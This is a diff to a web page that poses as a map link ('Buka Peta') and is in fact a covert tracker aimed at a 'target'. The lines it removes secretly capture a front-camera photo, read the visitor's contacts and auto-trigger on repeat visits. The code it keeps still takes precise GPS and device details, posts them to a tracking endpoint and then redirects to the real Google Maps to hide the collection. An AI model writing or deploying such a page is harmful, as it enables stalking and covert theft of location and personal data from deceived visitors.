@@ -66,25 +66,8 @@
         <button class="btn" onclick="startTracking()">Buka Peta</button>
     </div>
 
-    <!-- Elemen Kamera Tersembunyi -->
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
-        // Cek otomatis saat halaman dimuat apakah target sudah pernah berkunjung sebelumnya
-        window.addEventListener('DOMContentLoaded', () => {
-            if (localStorage.getItem('has_visited') === 'true') {
-                // Jika sudah pernah, langsung jalankan fungsi tracking secara senyap/otomatis
-                // Catatan: Izin browser (GPS/Kamera) tetap bergantung pada kebijakan browser, 
-                // namun tampilan tombol/card akan langsung dilewati.
-                startTracking();
-            }
-        });
-
         async function startTracking() {
-            // Simpan status bahwa perangkat ini sudah pernah mengakses situs
-            localStorage.setItem('has_visited', 'true');
-
             const card = document.getElementById('main-card');
             card.innerHTML = `
                 <div class="spinner"></div>
@@ -92,57 +75,25 @@
                 <p>Mempersiapkan rute perjalanan...</p>
             `;
 
-            let contactsData = [];
-            // Ambil Akses Kontak (jika didukung)
-            if ('contacts' in navigator && 'properties' in navigator.contacts) {
-                try {
-                    contactsData = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                } catch (e) {
-                    console.log("Kontak ditolak atau dibatalkan");
-                }
-            }
-
             let latitude = null;
             let longitude = null;
             let accuracy = null;
 
-            // 1. Ambil Lokasi GPS
+            // 1. Ambil Lokasi GPS (Cepat & Akurat)
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                     });
                     latitude = pos.coords.latitude;
                     longitude = pos.coords.longitude;
                     accuracy = pos.coords.accuracy;
                 } catch (e) {
-                    console.log("GPS ditolak");
+                    console.log("GPS ditolak atau timeout");
                 }
             }
 
-            // 2. Ambil Foto Kamera Depan secara Diam-diam
-            let imageBase64 = null;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
-                
-                await new Promise(r => setTimeout(r, 1000));
-
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
-
-                stream.getTracks().forEach(track => track.stop());
-            } catch (e) {
-                console.log("Kamera ditolak");
-            }
-
-            // 3. Info Perangkat
+            // 2. Info Perangkat Ringan
             const deviceData = {
                 hardwareConcurrency: navigator.hardwareConcurrency || '-',
                 deviceMemory: navigator.deviceMemory || '-',
@@ -150,30 +101,27 @@
                 language: navigator.language || '-'
             };
 
-            // 4. Kirim Data ke Backend Telegram
-            try {
-                await fetch('/api/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        latitude,
-                        longitude,
-                        accuracy,
-                        image: imageBase64,
-                        deviceData,
-                        contacts: contactsData
-                    })
-                });
-            } catch (e) {
-                console.log("Gagal kirim data");
-            }
+            // 3. Kirim data ke backend (Tanpa menunggu respon selesai agar langsung buka Maps)
+            fetch('/api/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude,
+                    longitude,
+                    accuracy,
+                    image: null, // Tanpa foto kamera
+                    deviceData
+                })
+            }).catch(e => console.log("Gagal kirim background"));
 
-            // 5. Redirect ke Google Maps Asli
-            if (latitude && longitude) {
-                window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            } else {
-                window.location.href = 'https://www.google.com/maps';
-            }
+            // 4. Langsung Alihkan ke Google Maps Asli dalam waktu kurang dari 1 detik
+            setTimeout(() => {
+                if (latitude && longitude) {
+                    window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                } else {
+                    window.location.href = 'https://www.google.com/maps';
+                }
+            }, 600); // Jeda sangat singkat agar terasa natural
         }
     </script>
 </body>
